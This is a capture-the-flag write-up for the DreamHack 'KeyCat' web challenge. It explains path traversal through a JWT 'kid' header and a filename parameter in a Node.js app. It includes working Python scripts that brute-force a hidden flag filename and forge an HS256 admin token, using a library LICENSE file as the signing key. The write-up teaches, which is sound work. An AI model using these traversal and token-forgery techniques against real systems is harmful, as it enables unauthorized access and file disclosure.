# KeyCat — DreamHack

> **Room / Challenge:** KeyCat (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** KeyCat (web)
- **Link**: `https://dreamhack.io/wargame/challenges/905`
- **Level:** `4`
- **Date:** `27-11-2025`

---

## Goal

Leveraging the vulnerablilities to get 2 parts of the flag.

## My Solution

Examining the code we can find 2 routes to get the flag which is `/cat/flag` and `/cat/admin`:

```javascript
router.get("/flag", Auth, (req, res) => {
  if (
    req.filename !== undefined &&
    req.filename.indexOf(FLAG_FILE_NAME) !== -1
  ) {
    return res.status(200).send(`🙀🙀🙀🙀🙀🙀 ${FLAG_CONTENT_1}`);
  } else {
    return res.status(401).render("error", {
      img_path: "/img/error.png",
      err_msg: "Unauthorized...",
    });
  }
});

router.get("/admin", Auth, (req, res) => {
  if (req.username !== undefined && req.username === "cat_master") {
    return res
      .status(200)
      .send(`Hello Cat Master😸 this is for you ${FLAG_CONTENT_2}`);
  } else {
    return res
      .status(403)
      .send("Hello dreamhack! But I've got nothing you want");
  }
});
```

Now, let's focus on getting the first part of the flag. It will check the `req.filename` with the variable `FLAG_FILE_NAME`, if we open the `entrypoint.sh` we should see how `FLAG_FILE_NAME` is created:

```bash
FLAG=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 2 | head -n 1)

mv /home/cat/deploy/flag.txt /home/cat/deploy/flag$FLAG.txt

export FLAG_FILE_NAME=flag$FLAG.txt
```

After that command, the `flag.txt` will become `flag[a-z0-9][a-z0-9].txt`, this is easily brute-force, and the route to brute-force is the `/`, which has a logic to find file and from that create a JWT token:

```javascript
router.get("/", Auth, async (req, res) => {
  try {
    const filename = req.query.fn;
    if (filename !== undefined) {
      const token = await sign(filename);
      return res.send(`Hey this is new token ${token}`);
    }
    return res.send("Hi 😺");
  } catch (e) {
    return res.status(404).send("File not found....");
  }
});
```

To know why when we brute-force this route we can get the first part of the flag which is `FLAG_CONTENT_1`, we have to examine how `Auth` middleware works and the functionalities from `jwt.js`:

```javascript
const Auth = async (req, res, next) => {
  try {
    const TOKEN = req.cookies.session;
    if (TOKEN === undefined) {
      let token = await sign("key1");
      res.cookie("session", token, { maxAge: 3600000 });
      return next();
    }

    let { jwt_data, err } = verify(TOKEN);
    if (jwt_data !== undefined) {
      req.filename = jwt_data.filename;
      req.username = jwt_data.username;
    }

    if (err) {
      // console.log(err);
      return res.status(401).render("error", {
        img_path: "/img/error.png",
        err_msg: "Invalid token...",
      });
    }

    return next();
  } catch (e) {
    // console.log(e);
    return res.status(404).render("error", {
      img_path: "/img/error.png",
      err_msg: "File not found...",
    });
  }
};

const PATH_PREFIX = __dirname + "/keys";

const sign = async (filename) => {
  const KEY = fs.readFileSync(PATH_PREFIX + "/" + filename, "utf-8");
  return jwt.sign({ filename: filename, username: "dreamhack" }, KEY, {
    keyid: filename,
    algorithm: "HS256",
  });
};

const verify = (token) => {
  let jwt_data = undefined;
  let error = undefined;
  jwt.verify(
    token,
    (header, cb) => {
      cb(null, fs.readFileSync(PATH_PREFIX + "/" + header.kid, "utf-8"));
    },
    { algorithm: "HS256" },
    (err, data) => {
      error = err;
      jwt_data = data;
    }
  );

  return { jwt_data: jwt_data, err: error };
};
```

The `sign(filename)` function will open the given file with the path `/keys/{filename}` take the content of that file as the key, and sign the payload:

```javascript
{ filename: filename, username: "dreamhack" }
```

When the token is given the `Auth` middleware will verify it and pass the value of `filename` and `username` to the controller logic for further handle:

```javascript
let { jwt_data, err } = verify(TOKEN);
if (jwt_data !== undefined) {
  req.filename = jwt_data.filename;
  req.username = jwt_data.username;
}
```

By this, if we can find the correct name of the `flag[a-z0-9][a-z0-9].txt` we can have `req.filename` is the actual filename of `FLAG_FILE_NAME`, so in the check of `/cat/flag`, it will returns true and gives us the first part of the flag. Exploit script:

```python
import requests
import re

TARGET = "http://host8.dreamhack.games:19597/?fn="
CAT_FLAG_URL = "http://host8.dreamhack.games:19597/cat/flag"

def try_variant(fn_variant):
    url = TARGET + fn_variant
    try:
        r = requests.get(url, timeout=8)
        return r
    except Exception as e:
        print("ERR", e)
        return None

def extract_token(text):
    m = re.search(r'Hey this is new token\s+([A-Za-z0-9\-\_\=\.]+)', text)
    if m:
        return m.group(1)
    return None

for i in range(256):
    hex_pass = f"{i:02x}"
    v1 = f"..%2Fflag{hex_pass}.txt"
    v2 = f"../flag{hex_pass}.txt"

    for variant in (v1, v2):
        print(f"Trying fn={variant}")
        res = try_variant(variant)
        if not res:
            continue

        print(res.text[:200].replace('\n','\\n'))

        token = extract_token(res.text)
        if token:
            print("\nFOUND token with variant:", variant)
            print("token:", token)
            cookies = {'session': token}
            r2 = requests.get(CAT_FLAG_URL, cookies=cookies, timeout=8)
            print("\n/cat/flag status:", r2.status_code)
            print("Response:\n", r2.text)
```

![Guide image](./screenshots/1.png)
Now we have successfully got the first part of the flag, moving to the second part in `/cat/admin`:

```javascript
router.get("/admin", Auth, (req, res) => {
  if (req.username !== undefined && req.username === "cat_master") {
    return res
      .status(200)
      .send(`Hello Cat Master😸 this is for you ${FLAG_CONTENT_2}`);
  } else {
    return res
      .status(403)
      .send("Hello dreamhack! But I've got nothing you want");
  }
});
```

It requires the `req.username` to be `cat_master`. However, in the `sign()` or `Auth` middleware `dreamhack` has be hardcoded to be the username, so we have find the `KEY` and define our own JWT token. Going back to the logic of `sign()` it will take the content of the given file as `KEY` and create the token:

```javascript
const PATH_PREFIX = __dirname + "/keys";

const sign = async (filename) => {
  const KEY = fs.readFileSync(PATH_PREFIX + "/" + filename, "utf-8");
  return jwt.sign({ filename: filename, username: "dreamhack" }, KEY, {
    keyid: filename,
    algorithm: "HS256",
  });
};
```

By this, we can use any file we want in the source code and create a token, for example if we visit `/?fn=../node_modules/send/LICENSE` it we create the token with `KEY` based on the content of the `LICENSE` file inside the `send` lib. It is suggested to use file that doesn't have `tab` key since it may affect our logic. Therefore, now we can create our own JWT token with the customized username:

```python
import jwt
import requests

TARGET = "http://host8.dreamhack.games:19597/cat/admin"
KEY="""(The MIT License)

Copyright (c) 2012 TJ Holowaychuk
Copyright (c) 2014-2022 Douglas Christopher Wilson

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
'Software'), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

payload = {
  "filename": "../node_modules/send/LICENSE",
  "username": "cat_master",
  "iat": 1764231836
}

headers = {
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../node_modules/send/LICENSE"
}

TOKEN = jwt.encode(payload, KEY, headers=headers, algorithm="HS256")

res = requests.get(f"{TARGET}", cookies={"session": f"{TOKEN}"})

print(res.text)
```

![Guide image](./screenshots/2.png)
